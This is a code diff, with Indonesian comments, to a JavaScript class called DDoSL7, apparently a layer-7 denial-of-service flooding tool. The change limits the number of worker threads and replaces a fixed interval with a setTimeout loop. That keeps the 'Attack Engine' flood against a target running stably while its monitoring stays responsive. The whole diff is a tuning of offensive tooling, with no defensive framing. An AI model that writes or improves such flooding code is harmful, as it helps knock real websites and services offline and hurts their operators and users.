@@ -92,7 +92,8 @@ class DDoSL7 {
         this.io = io;
         this.isRunning = false;
         this.startTime = null;
-        this.concurrency = optimizer.getAdaptiveConcurrency(800); 
+        // Batasi jumlah Worker nyata (OS level) agar tidak mencekik CPU
+        this.maxWorkers = Math.min(os.cpus().length * 2, 4); 
         this.safeModeActive = false;
         this.safeModeCooldown = 0;
         this.workers = [];
@@ -196,7 +197,7 @@ class DDoSL7 {
         this.startTime = Date.now();
         this.emitLog(`[CORE] Attack Engine Started`, 'success');
         if (isMainThread) {
-            for (let i = 0; i < this.concurrency; i++) {
+            for (let i = 0; i < this.maxWorkers; i++) {
                 const worker = new Worker(__filename, {
                     workerData: {
                         target: this.target,
@@ -317,15 +318,17 @@ class DDoSL7 {
     }
 
     floodOrchestrator() {
-        const floodLoop = setInterval(() => {
+        const runNext = () => {
             if (!this.isRunning) return;
             if (DurationManager.isExpired(this.startTime, this.duration)) {
-                clearInterval(floodLoop);
                 this.stop();
                 return;
             }
             this.executeVectors();
-        }, 100); // Meningkatkan interval ke 100ms untuk mengurangi Event Loop Lag
+            // Gunakan setTimeout agar Event Loop bisa memproses monitoring di sela-sela serangan
+            setTimeout(runNext, this.safeModeActive ? 500 : 150);
+        };
+        runNext();
     }
 
     activateSafeMode() {
